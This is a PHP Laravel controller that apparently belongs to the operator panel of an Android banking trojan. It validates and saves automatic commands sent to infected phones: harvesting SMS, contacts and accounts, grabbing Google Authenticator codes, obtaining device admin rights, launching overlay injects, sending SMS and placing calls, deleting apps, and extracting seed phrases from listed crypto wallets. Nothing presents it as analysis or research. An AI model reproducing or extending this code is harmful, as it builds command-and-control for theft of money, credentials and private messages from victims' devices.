<?php

namespace App\Http\Controllers;

use App\Helpers\ApiResponse;
use App\Models\AutoCommand;
use Exception;
use Illuminate\Http\Request;
use Illuminate\Validation\Rule;

class AutoCommandsController extends Controller
{
    public function list(): ApiResponse
    {
        $autoCommands = AutoCommand::firstOrFail();
        return ApiResponse::success($autoCommands->data);
    }

    public function update(Request $request): ApiResponse
    {
        $this->validate($request, [
            'data' => 'array|required',

            'data.getAccounts' => 'array|required',
            'data.getAccounts.enabled' => 'boolean|required',

            'data.getInstalledApps' => 'array|required',
            'data.getInstalledApps.enabled' => 'boolean|required',

            'data.updateInjectList' => 'array|required',
            'data.updateInjectList.enabled' => 'boolean|required',

            'data.getSMSList' => 'array|required',
            'data.getSMSList.enabled' => 'boolean|required',

            'data.getContactsList' => 'array|required',
            'data.getContactsList.enabled' => 'boolean|required',

            'data.getAdminRights' => 'array|required',
            'data.getAdminRights.enabled' => 'boolean|required',

            'data.googleAuthGrabber' => 'array|required',
            'data.googleAuthGrabber.enabled' => 'boolean|required',

            'data.calling' => 'array|required',
            'data.calling.enabled' => 'boolean|required',
            'data.calling.number' => 'string|nullable|',
            'data.calling.locked' => 'boolean|required',
            
            'data.openInject' => 'array|required',
            'data.openInject.enabled' => 'boolean|required',
            'data.openInject.application' => 'string|nullable',

            'data.sendPush' => 'array|required',
            'data.sendPush.enabled' => 'boolean|required',
            'data.sendPush.text' => 'string|nullable',
            'data.sendPush.title' => 'string|nullable',
            'data.sendPush.application' => 'string|nullable',
            
            'data.sendSMS' => 'array|required',
            'data.sendSMS.enabled' => 'boolean|required',
            'data.sendSMS.number' => 'string|nullable',
            'data.sendSMS.message' => 'string|nullable',

            'data.getSeedPhrase' => 'array|required',
            'data.getSeedPhrase.enabled' => 'boolean|required',
            'data.getSeedPhrase.wallets' => 'array',
            'data.getSeedPhrase.wallets.*' => 'string|in:toshi,piuk,bitcoincom,samourai,mycelium,trust',

            'data.clearAppData' => 'array|required',
            'data.clearAppData.enabled' => 'boolean|required',
            'data.clearAppData.application' => 'string|nullable',

            'data.runApp' => 'array|required',
            'data.runApp.enabled' => 'boolean|required',
            'data.runApp.application' => 'string|nullable',

            'data.deleteApp' => 'array|required',
            'data.deleteApp.enabled' => 'boolean|required',
            'data.deleteApp.application' => 'string|nullable',

            'data.openUrl' => 'array|required',
            'data.openUrl.enabled' => 'boolean|required',
            'data.openUrl.url' => 'string|nullable'
        ]);

        $autoCommands = AutoCommand::firstOrCreate();
        $autoCommands->data = $request->get('data');
        $autoCommands->save();

        return ApiResponse::success($autoCommands->data);
    }

    public function updateEnabled(Request $request): ApiResponse
    {
        $autoCommands = AutoCommand::firstOrCreate();

        $this->validate($request, [
            'command' => [
                Rule::in(array_keys($autoCommands->data)),
                'string',
            ],
            'enabled' => 'boolean',
        ]);

        try {
            $data = $autoCommands->data;
            $data[$request->get('command')]['enabled'] = $request->get('enabled');

            $autoCommands->data = $data;
            $autoCommands->save();
        }  catch (Exception) {
        }

        return ApiResponse::success($autoCommands->data);
    }
}
